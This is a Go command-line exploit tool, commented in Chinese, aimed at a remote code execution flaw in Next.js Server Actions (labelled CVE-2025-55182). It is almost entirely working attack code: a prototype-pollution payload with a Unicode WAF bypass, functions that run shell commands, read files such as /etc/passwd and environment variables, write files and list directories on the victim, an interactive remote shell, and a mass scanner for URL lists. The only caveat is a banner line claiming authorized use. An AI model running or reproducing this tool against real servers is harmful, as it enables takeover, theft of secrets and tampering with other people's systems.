package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"mime/multipart"
	"net/http"
	"net/url"
	"os"
	"path"
	"regexp"
	"sort"
	"strings"
	"sync"
	"time"
)

type RemoteFileCLI struct {
	Name  string `json:"n"`
	IsDir bool   `json:"d"`
	Size  int64  `json:"s"`
}

type ExploitResultCLI struct {
	Success bool   `json:"success"`
	Result  string `json:"result"`
	Error   string `json:"error,omitempty"`
}

type CVEExploitCLI struct {
	client    *http.Client
	timeout   time.Duration
	verifySSL bool
	userAgent string
}

func NewCVEExploitCLI(timeout time.Duration, verifySSL bool, proxyAddr string) (*CVEExploitCLI, error) {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: !verifySSL},
		MaxIdleConns:    200,
		MaxConnsPerHost: 200,
	}

	if proxyAddr != "" {
		if !strings.HasPrefix(proxyAddr, "http://") && !strings.HasPrefix(proxyAddr, "https://") && !strings.HasPrefix(proxyAddr, "socks5://") {
			proxyAddr = "http://" + proxyAddr
		}
		proxyURL, err := url.Parse(proxyAddr)
		if err != nil {
			return nil, fmt.Errorf("代理地址格式错误: %v", err)
		}
		tr.Proxy = http.ProxyURL(proxyURL)
	}

	return &CVEExploitCLI{
		client:    &http.Client{Transport: tr, Timeout: timeout},
		timeout:   timeout,
		verifySSL: verifySSL,
		userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	}, nil
}

func normalizeURLCLI(url string) string {
	url = strings.TrimSpace(url)
	if url == "" {
		return ""
	}
	if !strings.HasPrefix(url, "http://") && !strings.HasPrefix(url, "https://") {
		return "http://" + url
	}
	return url
}

func EncodeUnicodeCLI(data []byte) []byte {
	var buf bytes.Buffer
	inString := false
	for i := 0; i < len(data); i++ {
		b := data[i]
		if b == '"' {
			inString = !inString
			buf.WriteByte(b)
			continue
		}
		if !inString {
			buf.WriteByte(b)
			continue
		}
		if b == '\\' {
			buf.WriteByte(b)
			if i+1 < len(data) {
				buf.WriteByte(data[i+1])
				i++
			}
			continue
		}
		fmt.Fprintf(&buf, "\\u%04x", b)
	}
	return buf.Bytes()
}

func (e *CVEExploitCLI) SendComplexPayload(ctx context.Context, targetURL, endpoint string, jsCode string, useWaf bool) (*ExploitResultCLI, error) {
	targetURL = normalizeURLCLI(targetURL)
	if targetURL == "" {
		return nil, fmt.Errorf("无效 URL")
	}
	if !strings.HasPrefix(endpoint, "/") {
		endpoint = "/" + endpoint
	}
	fullURL := strings.TrimSuffix(targetURL, "/") + endpoint

	injection := fmt.Sprintf(`var res=%s;if(typeof res!=='string'){try{res=JSON.stringify(res,null,2)}catch(e){res='[JSON Error]'}};throw Object.assign(new Error('NEXT_REDIRECT'),{digest: 'NEXT_REDIRECT;push;/login?a=' + encodeURIComponent(res) + ';307;'});`, jsCode)

	payloadMap := map[string]interface{}{
		"then":   "$1:__proto__:then",
		"status": "resolved_model",
		"reason": -1,
		"value":  "{\"then\":\"$B1337\"}",
		"_response": map[string]interface{}{
			"_prefix": injection,
			"_chunks": "$Q2",
			"_formData": map[string]string{
				"get": "$1:constructor:constructor",
			},
		},
	}

	payloadBytes, err := json.Marshal(payloadMap)
	if err != nil {
		return nil, fmt.Errorf("JSON 构造失败: %v", err)
	}

	if useWaf {
		payloadBytes = EncodeUnicodeCLI(payloadBytes)
	}

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part0, _ := writer.CreateFormField("0")
	part0.Write(payloadBytes)
	part1, _ := writer.CreateFormField("1")
	part1.Write([]byte(`"$@0"`))
	part2, _ := writer.CreateFormField("2")
	part2.Write([]byte(`[]`))
	writer.Close()

	var req *http.Request
	if ctx != nil {
		req, err = http.NewRequestWithContext(ctx, "POST", fullURL, body)
	} else {
		req, err = http.NewRequest("POST", fullURL, body)
	}
	if err != nil {
		return nil, err
	}

	req.Header.Set("Content-Type", writer.FormDataContentType())
	req.Header.Set("User-Agent", e.userAgent)
	req.Header.Set("Next-Action", "x")
	req.Header.Set("X-Nextjs-Request-Id", "rce-"+fmt.Sprint(rand.Intn(9999)))

	resp, err := e.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	var rawLocation string
	if loc := resp.Header.Get("X-Action-Redirect"); loc != "" {
		rawLocation = loc
	} else {
		bodyBytes, _ := io.ReadAll(resp.Body)
		rawLocation = string(bodyBytes)
	}

	re := regexp.MustCompile(`[?&]a=([^;&]+)`)
	matches := re.FindStringSubmatch(rawLocation)
	if len(matches) > 1 {
		encodedVal := matches[1]
		decoded, err := url.QueryUnescape(encodedVal)
		if err == nil {
			return &ExploitResultCLI{Success: true, Result: decoded}, nil
		}
		return &ExploitResultCLI{Success: true, Result: encodedVal}, nil
	}

	if resp.StatusCode == 500 {
		return &ExploitResultCLI{Success: false, Error: "Server 500 Error"}, nil
	}
	return &ExploitResultCLI{Success: false, Error: "Payload sent but no result captured"}, nil
}

func (e *CVEExploitCLI) ExecuteCommand(targetURL, endpoint, command string, useWaf bool, isAsync bool) (string, error) {
	escapedCmd := strings.ReplaceAll(command, "'", "\\'")
	var payload string
	if isAsync {
		payload = fmt.Sprintf(`(function(){ process.mainModule.require('child_process').exec('%s'); return 'Async execution started'; })()`, escapedCmd)
	} else {
		payload = fmt.Sprintf(`process.mainModule.require('child_process').execSync('%s').toString()`, escapedCmd)
	}

	res, err := e.SendComplexPayload(nil, targetURL, endpoint, payload, useWaf)
	if err != nil {
		return "", err
	}
	if !res.Success {
		return "", fmt.Errorf("执行失败: %s", res.Error)
	}
	return res.Result, nil
}

func (e *CVEExploitCLI) ExecuteJS(targetURL, endpoint, code string, useWaf bool) (string, error) {
	res, err := e.SendComplexPayload(nil, targetURL, endpoint, code, useWaf)
	if err != nil {
		return "", err
	}
	if !res.Success {
		return "", fmt.Errorf("执行失败: %s", res.Error)
	}
	return res.Result, nil
}

func (e *CVEExploitCLI) ReadFile(targetURL, endpoint, filePath string, useWaf bool) (string, error) {
	escapedPath := strings.ReplaceAll(filePath, "'", "\\'")
	payload := fmt.Sprintf(`process.mainModule.require('fs').readFileSync('%s', 'utf-8')`, escapedPath)

	res, err := e.SendComplexPayload(nil, targetURL, endpoint, payload, useWaf)
	if err != nil {
		return "", err
	}
	if !res.Success {
		return "", fmt.Errorf("读取失败: %s", res.Error)
	}
	return res.Result, nil
}

func (e *CVEExploitCLI) WriteFile(targetURL, endpoint, filePath, content string, useWaf bool) (string, error) {
	escapedPath := strings.ReplaceAll(filePath, "'", "\\'")
	escapedContent := strings.ReplaceAll(content, "'", "\\'")
	escapedContent = strings.ReplaceAll(escapedContent, "\n", "\\n")

	payload := fmt.Sprintf(`(function(){ process.mainModule.require('fs').writeFileSync('%s', '%s'); return 'Write Success'; })()`, escapedPath, escapedContent)

	res, err := e.SendComplexPayload(nil, targetURL, endpoint, payload, useWaf)
	if err != nil {
		return "", err
	}
	if !res.Success {
		return "", fmt.Errorf("写入失败: %s", res.Error)
	}
	return res.Result, nil
}

// Check 检测目标是否存在漏洞 (被动检测)
// 通过检测 Next.js 版本和特征来判断，不发送攻击 payload
func (e *CVEExploitCLI) Check(targetURL, endpoint string, useWaf bool) (vulnerable bool, version string, err error) {
	targetURL = normalizeURLCLI(targetURL)
	if targetURL == "" {
		return false, "", fmt.Errorf("无效 URL")
	}

	// 方法1: 检查响应头中的 Next.js 特征
	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		return false, "", err
	}
	req.Header.Set("User-Agent", e.userAgent)

	resp, err := e.client.Do(req)
	if err != nil {
		return false, "", err
	}
	defer resp.Body.Close()

	// 检查 X-Powered-By 头
	poweredBy := resp.Header.Get("X-Powered-By")
	if strings.Contains(poweredBy, "Next.js") {
		version = poweredBy
	}

	// 读取响应体检查特征
	bodyBytes, _ := io.ReadAll(resp.Body)
	body := string(bodyBytes)

	// 检查 Next.js 特征
	isNextJS := false
	if strings.Contains(body, "/_next/static") ||
		strings.Contains(body, "__NEXT_DATA__") ||
		strings.Contains(body, "next/dist") ||
		strings.Contains(body, "_next/") {
		isNextJS = true
	}

	if !isNextJS && version == "" {
		return false, "", nil // 不是 Next.js
	}

	// 方法2: 检查 /_next/static 路径是否存在
	staticReq, _ := http.NewRequest("GET", strings.TrimSuffix(targetURL, "/")+"/", nil)
	staticReq.Header.Set("User-Agent", e.userAgent)

	// 方法3: 检查是否存在 Server Actions (通过 RSC 特征)
	// 发送一个普通的 POST 请求检查响应特征，不发送攻击 payload
	checkReq, err := http.NewRequest("POST", strings.TrimSuffix(targetURL, "/")+endpoint, strings.NewReader(""))
	if err != nil {
		return isNextJS, version, nil
	}
	checkReq.Header.Set("User-Agent", e.userAgent)
	checkReq.Header.Set("Content-Type", "multipart/form-data")
	checkReq.Header.Set("Next-Action", "test")

	checkResp, err := e.client.Do(checkReq)
	if err != nil {
		return isNextJS, version, nil
	}
	defer checkResp.Body.Close()

	// 如果服务器响应包含 RSC 相关头或特征，可能存在漏洞
	hasRSC := checkResp.Header.Get("Content-Type") == "text/x-component" ||
		checkResp.Header.Get("x-action-revalidated") != "" ||
		checkResp.StatusCode == 500 // Server Actions 端点通常返回特定响应

	// 综合判断
	if isNextJS && hasRSC {
		return true, version, nil // 可能存在漏洞
	}

	return isNextJS, version, nil // 是 Next.js 但不确定是否有漏洞
}

// CheckActive 主动检测 (会发送 payload，更准确但会留下日志)
func (e *CVEExploitCLI) CheckActive(targetURL, endpoint string, useWaf bool) (bool, error) {
	res, err := e.SendComplexPayload(nil, targetURL, endpoint, "1+1", useWaf)
	if err != nil {
		return false, err
	}
	return res.Success && res.Result == "2", nil
}

// ScanResult 扫描结果
type ScanResult struct {
	URL        string
	IsNextJS   bool
	Vulnerable bool
	Version    string
	Error      string
}

// ScanTargets 批量扫描目标 (被动检测)
func ScanTargets(targets []string, endpoint, proxy string, useWaf bool, concurrency int, timeout time.Duration, activeMode bool) []ScanResult {
	results := make([]ScanResult, len(targets))
	var wg sync.WaitGroup
	semaphore := make(chan struct{}, concurrency)

	for i, target := range targets {
		wg.Add(1)
		go func(idx int, url string) {
			defer wg.Done()
			semaphore <- struct{}{}
			defer func() { <-semaphore }()

			exploit, err := NewCVEExploitCLI(timeout, false, proxy)
			if err != nil {
				results[idx] = ScanResult{URL: url, Error: err.Error()}
				return
			}

			if activeMode {
				// 主动检测模式 (会发送 payload)
				vulnerable, err := exploit.CheckActive(url, endpoint, useWaf)
				if err != nil {
					results[idx] = ScanResult{URL: url, Error: err.Error()}
				} else {
					results[idx] = ScanResult{URL: url, IsNextJS: true, Vulnerable: vulnerable}
				}
			} else {
				// 被动检测模式 (不发送攻击 payload)
				vulnerable, version, err := exploit.Check(url, endpoint, useWaf)
				if err != nil {
					results[idx] = ScanResult{URL: url, Error: err.Error()}
				} else {
					results[idx] = ScanResult{URL: url, IsNextJS: vulnerable || version != "", Vulnerable: vulnerable, Version: version}
				}
			}
		}(i, target)
	}

	wg.Wait()
	return results
}

func (e *CVEExploitCLI) ListFiles(targetURL, endpoint, dirPath string, useWaf bool) ([]RemoteFileCLI, error) {
	escapedPath := strings.ReplaceAll(dirPath, "'", "\\'")
	payload := fmt.Sprintf(`(function(){
		try {
			const fs = process.mainModule.require('fs');
			const p = process.mainModule.require('path');
			const target = '%s';
			const items = fs.readdirSync(target);
			const ret = items.map(i => {
				try {
					const s = fs.statSync(p.join(target, i));
					return { n: i, d: s.isDirectory(), s: s.size };
				} catch(e) { return { n: i, d: false, s: -1 }; }
			});
			return JSON.stringify(ret);
		} catch(e) { return "ERROR: " + e.message; }
	})()`, escapedPath)

	res, err := e.SendComplexPayload(nil, targetURL, endpoint, payload, useWaf)
	if err != nil {
		return nil, err
	}
	if !res.Success {
		return nil, fmt.Errorf("操作失败: %s", res.Error)
	}
	if strings.HasPrefix(res.Result, "ERROR:") {
		return nil, fmt.Errorf("服务端错误: %s", res.Result)
	}

	var files []RemoteFileCLI
	err = json.Unmarshal([]byte(res.Result), &files)
	if err != nil {
		return nil, fmt.Errorf("解析目录数据失败: %v", err)
	}

	sort.Slice(files, func(i, j int) bool {
		if files[i].IsDir != files[j].IsDir {
			return files[i].IsDir
		}
		return files[i].Name < files[j].Name
	})
	return files, nil
}

func printBanner() {
	fmt.Println(`
╔═══════════════════════════════════════════════════════════╗
║       Next.js RCE Exploit Tool (CLI Version)              ║
║                                                           ║
║  [!] 仅供安全研究与授权测试使用                              ║
╚═══════════════════════════════════════════════════════════╝`)
}

func printUsage() {
	fmt.Println(`
用法: nextjs-exploit-cli <command> [options]

Commands:
  check     检测目标是否存在漏洞
  scan      批量扫描多个目标
  exec      执行系统命令
  js        执行 JavaScript 代码
  ls        列出目录内容
  read      读取文件
  write     写入文件
  shell     交互式命令行

Options:
  -t, --target    目标 URL (必需)
  -e, --endpoint  API 端点 (默认: /)
  -p, --proxy     代理地址 (如: 127.0.0.1:8080)
  -w, --waf       启用 Unicode 编码绕过 WAF
  -h, --help      显示帮助

Examples:
  ./cli check -t http://target.com
  ./cli scan -f urls.txt -o results.txt -c 10
  ./cli exec -t http://target.com -c "whoami"
  ./cli ls -t http://target.com -d /etc
  ./cli read -t http://target.com -f /etc/passwd
  ./cli write -t http://target.com -f /tmp/test.txt -c "hello"
  ./cli js -t http://target.com -c "process.env"
  ./cli shell -t http://target.com
`)
}

func main() {
	rand.Seed(time.Now().UnixNano())

	if len(os.Args) < 2 {
		printBanner()
		printUsage()
		os.Exit(0)
	}

	// Global flags
	var target, endpoint, proxy string
	var waf bool

	// Command specific flags
	execCmd := flag.NewFlagSet("exec", flag.ExitOnError)
	execTarget := execCmd.String("t", "", "目标 URL")
	execEndpoint := execCmd.String("e", "/", "API 端点")
	execProxy := execCmd.String("p", "", "代理地址")
	execWaf := execCmd.Bool("w", false, "Unicode 编码")
	execCommand := execCmd.String("c", "", "要执行的命令")
	execAsync := execCmd.Bool("async", false, "异步执行 (无回显)")

	jsCmd := flag.NewFlagSet("js", flag.ExitOnError)
	jsTarget := jsCmd.String("t", "", "目标 URL")
	jsEndpoint := jsCmd.String("e", "/", "API 端点")
	jsProxy := jsCmd.String("p", "", "代理地址")
	jsWaf := jsCmd.Bool("w", false, "Unicode 编码")
	jsCode := jsCmd.String("c", "", "JavaScript 代码")

	lsCmd := flag.NewFlagSet("ls", flag.ExitOnError)
	lsTarget := lsCmd.String("t", "", "目标 URL")
	lsEndpoint := lsCmd.String("e", "/", "API 端点")
	lsProxy := lsCmd.String("p", "", "代理地址")
	lsWaf := lsCmd.Bool("w", false, "Unicode 编码")
	lsDir := lsCmd.String("d", "/", "目录路径")

	readCmd := flag.NewFlagSet("read", flag.ExitOnError)
	readTarget := readCmd.String("t", "", "目标 URL")
	readEndpoint := readCmd.String("e", "/", "API 端点")
	readProxy := readCmd.String("p", "", "代理地址")
	readWaf := readCmd.Bool("w", false, "Unicode 编码")
	readFile := readCmd.String("f", "", "文件路径")

	writeCmd := flag.NewFlagSet("write", flag.ExitOnError)
	writeTarget := writeCmd.String("t", "", "目标 URL")
	writeEndpoint := writeCmd.String("e", "/", "API 端点")
	writeProxy := writeCmd.String("p", "", "代理地址")
	writeWaf := writeCmd.Bool("w", false, "Unicode 编码")
	writeFile := writeCmd.String("f", "", "文件路径")
	writeContent := writeCmd.String("c", "", "文件内容")

	shellCmd := flag.NewFlagSet("shell", flag.ExitOnError)
	shellTarget := shellCmd.String("t", "", "目标 URL")
	shellEndpoint := shellCmd.String("e", "/", "API 端点")
	shellProxy := shellCmd.String("p", "", "代理地址")
	shellWaf := shellCmd.Bool("w", false, "Unicode 编码")

	checkCmd := flag.NewFlagSet("check", flag.ExitOnError)
	checkTarget := checkCmd.String("t", "", "目标 URL")
	checkEndpoint := checkCmd.String("e", "/", "API 端点")
	checkProxy := checkCmd.String("p", "", "代理地址")
	checkWaf := checkCmd.Bool("w", false, "Unicode 编码")
	checkActive := checkCmd.Bool("active", false, "主动检测模式 (发送payload, 更准确)")

	scanCmd := flag.NewFlagSet("scan", flag.ExitOnError)
	scanFile := scanCmd.String("f", "", "URL 列表文件")
	scanEndpoint := scanCmd.String("e", "/", "API 端点")
	scanProxy := scanCmd.String("p", "", "代理地址")
	scanWaf := scanCmd.Bool("w", false, "Unicode 编码")
	scanOutput := scanCmd.String("o", "", "输出结果文件")
	scanConcurrency := scanCmd.Int("c", 5, "并发数")
	scanTimeout := scanCmd.Int("timeout", 10, "超时时间(秒)")
	scanActive := scanCmd.Bool("active", false, "主动检测模式 (发送payload, 更准确)")

	command := os.Args[1]

	switch command {
	case "check":
		checkCmd.Parse(os.Args[2:])
		if *checkTarget == "" {
			fmt.Println("[!] 错误: 需要 -t (目标)")
			checkCmd.PrintDefaults()
			os.Exit(1)
		}
		exploit, err := NewCVEExploitCLI(10*time.Second, false, *checkProxy)
		if err != nil {
			fmt.Printf("[!] 初始化失败: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("[*] 检测目标: %s\n", *checkTarget)

		if *checkActive {
			// 主动检测模式
			fmt.Println("[*] 模式: 主动检测 (会发送 payload)")
			vulnerable, err := exploit.CheckActive(*checkTarget, *checkEndpoint, *checkWaf)
			if err != nil {
				fmt.Printf("[-] 检测失败: %v\n", err)
				os.Exit(1)
			}
			if vulnerable {
				fmt.Println("\033[32m[+] 漏洞存在! (CVE-2025-55182) - 已确认\033[0m")
			} else {
				fmt.Println("[-] 目标不受影响")
			}
		} else {
			// 被动检测模式
			fmt.Println("[*] 模式: 被动检测 (不发送攻击 payload)")
			vulnerable, version, err := exploit.Check(*checkTarget, *checkEndpoint, *checkWaf)
			if err != nil {
				fmt.Printf("[-] 检测失败: %v\n", err)
				os.Exit(1)
			}
			if version != "" {
				fmt.Printf("[*] 版本: %s\n", version)
			}
			if vulnerable {
				fmt.Println("\033[33m[+] 可能存在漏洞 (Next.js + Server Actions 特征)\033[0m")
				fmt.Println("[*] 使用 --active 进行主动验证")
			} else if version != "" {
				fmt.Println("[*] 检测到 Next.js，但未发现 Server Actions 特征")
			} else {
				fmt.Println("[-] 未检测到 Next.js 或目标不受影响")
			}
		}

	case "scan":
		scanCmd.Parse(os.Args[2:])
		if *scanFile == "" {
			fmt.Println("[!] 错误: 需要 -f (URL 列表文件)")
			scanCmd.PrintDefaults()
			os.Exit(1)
		}

		// 读取 URL 列表
		file, err := os.Open(*scanFile)
		if err != nil {
			fmt.Printf("[!] 无法打开文件: %v\n", err)
			os.Exit(1)
		}
		defer file.Close()

		var targets []string
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line != "" && !strings.HasPrefix(line, "#") {
				targets = append(targets, line)
			}
		}

		if len(targets) == 0 {
			fmt.Println("[!] 文件中没有有效的 URL")
			os.Exit(1)
		}

		fmt.Printf("[*] 加载 %d 个目标\n", len(targets))
		if *scanActive {
			fmt.Printf("[*] 开始扫描 (模式: 主动, 并发: %d, 超时: %ds)\n", *scanConcurrency, *scanTimeout)
		} else {
			fmt.Printf("[*] 开始扫描 (模式: 被动, 并发: %d, 超时: %ds)\n", *scanConcurrency, *scanTimeout)
		}

		results := ScanTargets(targets, *scanEndpoint, *scanProxy, *scanWaf, *scanConcurrency, time.Duration(*scanTimeout)*time.Second, *scanActive)

		// 统计结果
		vulnCount := 0
		nextjsCount := 0
		var outputLines []string

		for _, r := range results {
			var line string
			if r.Error != "" {
				line = fmt.Sprintf("[-] %s - 错误: %s", r.URL, r.Error)
			} else if r.Vulnerable {
				if *scanActive {
					line = fmt.Sprintf("\033[32m[+] %s - 漏洞确认\033[0m", r.URL)
				} else {
					line = fmt.Sprintf("\033[33m[+] %s - 可能存在漏洞\033[0m", r.URL)
				}
				vulnCount++
				nextjsCount++
			} else if r.IsNextJS {
				line = fmt.Sprintf("[*] %s - Next.js (未确认漏洞)", r.URL)
				nextjsCount++
			} else {
				line = fmt.Sprintf("[-] %s - 非 Next.js", r.URL)
			}
			fmt.Println(line)
			// 移除颜色代码用于文件输出
			cleanLine := strings.ReplaceAll(line, "\033[32m", "")
			cleanLine = strings.ReplaceAll(cleanLine, "\033[33m", "")
			cleanLine = strings.ReplaceAll(cleanLine, "\033[0m", "")
			outputLines = append(outputLines, cleanLine)
		}

		fmt.Printf("\n[*] 扫描完成: %d 个目标, %d 个 Next.js, %d 个可能存在漏洞\n", len(targets), nextjsCount, vulnCount)
		if !*scanActive && vulnCount > 0 {
			fmt.Println("[*] 提示: 使用 --active 进行主动验证")
		}

		// 输出到文件
		if *scanOutput != "" {
			outFile, err := os.Create(*scanOutput)
			if err != nil {
				fmt.Printf("[!] 无法创建输出文件: %v\n", err)
			} else {
				defer outFile.Close()
				for _, line := range outputLines {
					outFile.WriteString(line + "\n")
				}
				fmt.Printf("[*] 结果已保存到: %s\n", *scanOutput)
			}
		}

	case "exec":
		execCmd.Parse(os.Args[2:])
		target, endpoint, proxy, waf = *execTarget, *execEndpoint, *execProxy, *execWaf
		if target == "" || *execCommand == "" {
			fmt.Println("[!] 错误: 需要 -t (目标) 和 -c (命令)")
			execCmd.PrintDefaults()
			os.Exit(1)
		}
		exploit, err := NewCVEExploitCLI(10*time.Second, false, proxy)
		if err != nil {
			fmt.Printf("[!] 初始化失败: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("[*] 目标: %s\n", target)
		fmt.Printf("[*] 执行: %s\n", *execCommand)
		result, err := exploit.ExecuteCommand(target, endpoint, *execCommand, waf, *execAsync)
		if err != nil {
			fmt.Printf("[!] 错误: %v\n", err)
			os.Exit(1)
		}
		fmt.Println("[+] 结果:")
		fmt.Println(result)

	case "js":
		jsCmd.Parse(os.Args[2:])
		target, endpoint, proxy, waf = *jsTarget, *jsEndpoint, *jsProxy, *jsWaf
		if target == "" || *jsCode == "" {
			fmt.Println("[!] 错误: 需要 -t (目标) 和 -c (JS代码)")
			jsCmd.PrintDefaults()
			os.Exit(1)
		}
		exploit, err := NewCVEExploitCLI(10*time.Second, false, proxy)
		if err != nil {
			fmt.Printf("[!] 初始化失败: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("[*] 目标: %s\n", target)
		fmt.Printf("[*] 执行 JS: %s\n", *jsCode)
		result, err := exploit.ExecuteJS(target, endpoint, *jsCode, waf)
		if err != nil {
			fmt.Printf("[!] 错误: %v\n", err)
			os.Exit(1)
		}
		fmt.Println("[+] 结果:")
		fmt.Println(result)

	case "ls":
		lsCmd.Parse(os.Args[2:])
		target, endpoint, proxy, waf = *lsTarget, *lsEndpoint, *lsProxy, *lsWaf
		if target == "" {
			fmt.Println("[!] 错误: 需要 -t (目标)")
			lsCmd.PrintDefaults()
			os.Exit(1)
		}
		exploit, err := NewCVEExploitCLI(10*time.Second, false, proxy)
		if err != nil {
			fmt.Printf("[!] 初始化失败: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("[*] 目标: %s\n", target)
		fmt.Printf("[*] 目录: %s\n", *lsDir)
		files, err := exploit.ListFiles(target, endpoint, *lsDir, waf)
		if err != nil {
			fmt.Printf("[!] 错误: %v\n", err)
			os.Exit(1)
		}
		fmt.Println("[+] 文件列表:")
		for _, f := range files {
			if f.IsDir {
				fmt.Printf("  [DIR]  %s/\n", f.Name)
			} else {
				fmt.Printf("  [FILE] %s (%d bytes)\n", f.Name, f.Size)
			}
		}

	case "read":
		readCmd.Parse(os.Args[2:])
		target, endpoint, proxy, waf = *readTarget, *readEndpoint, *readProxy, *readWaf
		if target == "" || *readFile == "" {
			fmt.Println("[!] 错误: 需要 -t (目标) 和 -f (文件路径)")
			readCmd.PrintDefaults()
			os.Exit(1)
		}
		exploit, err := NewCVEExploitCLI(10*time.Second, false, proxy)
		if err != nil {
			fmt.Printf("[!] 初始化失败: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("[*] 目标: %s\n", target)
		fmt.Printf("[*] 读取: %s\n", *readFile)
		content, err := exploit.ReadFile(target, endpoint, *readFile, waf)
		if err != nil {
			fmt.Printf("[!] 错误: %v\n", err)
			os.Exit(1)
		}
		fmt.Println("[+] 文件内容:")
		fmt.Println(content)

	case "write":
		writeCmd.Parse(os.Args[2:])
		target, endpoint, proxy, waf = *writeTarget, *writeEndpoint, *writeProxy, *writeWaf
		if target == "" || *writeFile == "" || *writeContent == "" {
			fmt.Println("[!] 错误: 需要 -t (目标), -f (文件路径) 和 -c (内容)")
			writeCmd.PrintDefaults()
			os.Exit(1)
		}
		exploit, err := NewCVEExploitCLI(10*time.Second, false, proxy)
		if err != nil {
			fmt.Printf("[!] 初始化失败: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("[*] 目标: %s\n", target)
		fmt.Printf("[*] 写入: %s\n", *writeFile)
		result, err := exploit.WriteFile(target, endpoint, *writeFile, *writeContent, waf)
		if err != nil {
			fmt.Printf("[!] 错误: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("[+] %s\n", result)

	case "shell":
		shellCmd.Parse(os.Args[2:])
		target, endpoint, proxy, waf = *shellTarget, *shellEndpoint, *shellProxy, *shellWaf
		if target == "" {
			fmt.Println("[!] 错误: 需要 -t (目标)")
			shellCmd.PrintDefaults()
			os.Exit(1)
		}
		exploit, err := NewCVEExploitCLI(10*time.Second, false, proxy)
		if err != nil {
			fmt.Printf("[!] 初始化失败: %v\n", err)
			os.Exit(1)
		}
		printBanner()
		fmt.Printf("[*] 目标: %s\n", target)
		fmt.Printf("[*] 端点: %s\n", endpoint)
		fmt.Println("[*] 输入 'exit' 退出, 'help' 查看帮助")
		fmt.Println()

		currentDir := "/"
		scanner := bufio.NewScanner(os.Stdin)

		for {
			fmt.Printf("\033[32m%s\033[0m > ", currentDir)
			if !scanner.Scan() {
				break
			}
			input := strings.TrimSpace(scanner.Text())
			if input == "" {
				continue
			}

			switch {
			case input == "exit" || input == "quit":
				fmt.Println("[*] Bye!")
				os.Exit(0)

			case input == "help":
				fmt.Println(`
交互式命令:
  <command>        执行系统命令 (如: whoami, id, ls -la)
  cd <path>        切换目录
  cat <file>       读取文件
  ls [path]        列出目录
  pwd              显示当前目录
  upload <f> <c>   写入文件
  js <code>        执行 JavaScript
  exit             退出
`)

			case input == "pwd":
				fmt.Println(currentDir)

			case strings.HasPrefix(input, "cd "):
				newDir := strings.TrimPrefix(input, "cd ")
				newDir = strings.TrimSpace(newDir)
				if !strings.HasPrefix(newDir, "/") {
					newDir = path.Join(currentDir, newDir)
				}
				// 验证目录是否存在
				_, err := exploit.ListFiles(target, endpoint, newDir, waf)
				if err != nil {
					fmt.Printf("[!] 目录不存在: %v\n", err)
				} else {
					currentDir = newDir
				}

			case strings.HasPrefix(input, "cat "):
				filePath := strings.TrimPrefix(input, "cat ")
				filePath = strings.TrimSpace(filePath)
				if !strings.HasPrefix(filePath, "/") {
					filePath = path.Join(currentDir, filePath)
				}
				content, err := exploit.ReadFile(target, endpoint, filePath, waf)
				if err != nil {
					fmt.Printf("[!] 读取失败: %v\n", err)
				} else {
					fmt.Println(content)
				}

			case input == "ls" || strings.HasPrefix(input, "ls "):
				dir := currentDir
				if strings.HasPrefix(input, "ls ") {
					dir = strings.TrimPrefix(input, "ls ")
					dir = strings.TrimSpace(dir)
					if !strings.HasPrefix(dir, "/") {
						dir = path.Join(currentDir, dir)
					}
				}
				files, err := exploit.ListFiles(target, endpoint, dir, waf)
				if err != nil {
					fmt.Printf("[!] 列目录失败: %v\n", err)
				} else {
					for _, f := range files {
						if f.IsDir {
							fmt.Printf("  \033[34m%s/\033[0m\n", f.Name)
						} else {
							fmt.Printf("  %s (%d)\n", f.Name, f.Size)
						}
					}
				}

			case strings.HasPrefix(input, "upload "):
				parts := strings.SplitN(strings.TrimPrefix(input, "upload "), " ", 2)
				if len(parts) < 2 {
					fmt.Println("[!] 用法: upload <filename> <content>")
					continue
				}
				filePath := parts[0]
				if !strings.HasPrefix(filePath, "/") {
					filePath = path.Join(currentDir, filePath)
				}
				result, err := exploit.WriteFile(target, endpoint, filePath, parts[1], waf)
				if err != nil {
					fmt.Printf("[!] 写入失败: %v\n", err)
				} else {
					fmt.Printf("[+] %s\n", result)
				}

			case strings.HasPrefix(input, "js "):
				code := strings.TrimPrefix(input, "js ")
				result, err := exploit.ExecuteJS(target, endpoint, code, waf)
				if err != nil {
					fmt.Printf("[!] JS执行失败: %v\n", err)
				} else {
					fmt.Println(result)
				}

			default:
				// 默认作为系统命令执行
				result, err := exploit.ExecuteCommand(target, endpoint, input, waf, false)
				if err != nil {
					fmt.Printf("[!] 命令执行失败: %v\n", err)
				} else {
					fmt.Println(result)
				}
			}
		}

	case "-h", "--help", "help":
		printBanner()
		printUsage()

	default:
		fmt.Printf("[!] 未知命令: %s\n", command)
		printUsage()
		os.Exit(1)
	}
}
